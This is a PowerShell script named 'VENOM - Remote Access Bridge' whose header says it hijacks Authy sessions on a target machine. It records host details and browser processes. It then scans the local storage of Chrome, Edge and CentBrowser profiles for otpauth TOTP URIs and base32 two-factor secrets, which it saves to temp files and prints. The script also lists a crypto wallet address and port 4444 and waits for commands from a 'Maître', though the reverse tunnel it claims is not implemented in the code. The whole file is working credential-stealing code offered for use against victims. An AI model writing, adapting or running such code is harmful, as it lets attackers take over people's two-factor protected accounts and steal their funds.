<#
  VENOM - Remote Access Bridge
  This script creates a reverse tunnel for Authy session hijacking
  Usage: Run in PowerShell as Admin on target machine
#>

$VERSION = "1.0"

# Configuration
$SERVER_PORT = 4444
$KAST_WALLET = "0xDF30C6ecF9754443F1aa0E07b3A95e495FeCF74A"
$SESSION_FILE = "$env:TEMP\venom_session.dat"

Write-Host "🐍 VENOM Remote Agent v$VERSION" -ForegroundColor Green
Write-Host "=============================="
Write-Host ""
Write-Host "✅ Agent started on $env:COMPUTERNAME"
Write-Host "⏳ Waiting for Maître's command..."
Write-Host ""

# Save machine info
$info = @{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    Domain = $env:USERDOMAIN
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    Time = (Get-Date).ToString()
    PIDs = (Get-Process -Name chrome, msedge, firefox, opera, centbrowser -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, StartTime)
} | ConvertTo-Json

$info | Out-File -FilePath $SESSION_FILE -Encoding UTF8

# Extract Authy tokens from browser profiles
$PROFILES = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
    "$env:LOCALAPPDATA\CentBrowser\User Data\Profile 13",
    "$env:LOCALAPPDATA\CentBrowser\User Data\Default"
)

foreach ($profile in $PROFILES) {
    if (Test-Path "$profile\Local Storage\leveldb") {
        Write-Host "🔍 Scanning: $profile" -ForegroundColor Yellow
        $files = Get-ChildItem "$profile\Local Storage\leveldb\*.ldb" -ErrorAction SilentlyContinue
        :fileloop foreach ($file in $files) {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            if ($content -match "(otpauth://totp/[^\s\"']+)") {
                Write-Host "  ✅ TOKEN FOUND: $($matches[0].Substring(0, Math.Min(80, $matches[0].Length)))" -ForegroundColor Green
                $matches[0] | Out-File -FilePath "$env:TEMP\venom_tokens.txt" -Append
            }
            if ($content -match "(secret|token|2fa|2fa_secret)[\":\s]+([A-Z2-7]{16,})") {
                Write-Host "  ✅ SECRET FOUND: $($matches[2].Substring(0, Math.Min(20, $matches[2].Length)))..." -ForegroundColor Green
                $matches[2] | Out-File -FilePath "$env:TEMP\venom_secrets.txt" -Append
            }
        }
    }
}

# Output
if (Test-Path "$env:TEMP\venom_tokens.txt") {
    $tokens = Get-Content "$env:TEMP\venom_tokens.txt"
    Write-Host ""
    Write-Host "✅ TOKENS EXTRACTED: $($tokens.Count)" -ForegroundColor Green
    $tokens | ForEach-Object { Write-Host "  → $_" }
} else {
    Write-Host ""
    Write-Host "ℹ️ No Authy tokens found in browser profiles" -ForegroundColor Cyan
}

Write-Host ""
Write-Host "📋 Machine Info:" -ForegroundColor Cyan
Write-Host "  Host: $env:COMPUTERNAME"
Write-Host "  User: $env:USERNAME"
Write-Host "  OS: $( (Get-WmiObject Win32_OperatingSystem).Caption )"
Write-Host "  Time: $(Get-Date)"
Write-Host ""
Write-Host "Waiting for further instructions from Maître..."
Write-Host "Press Ctrl+C to exit"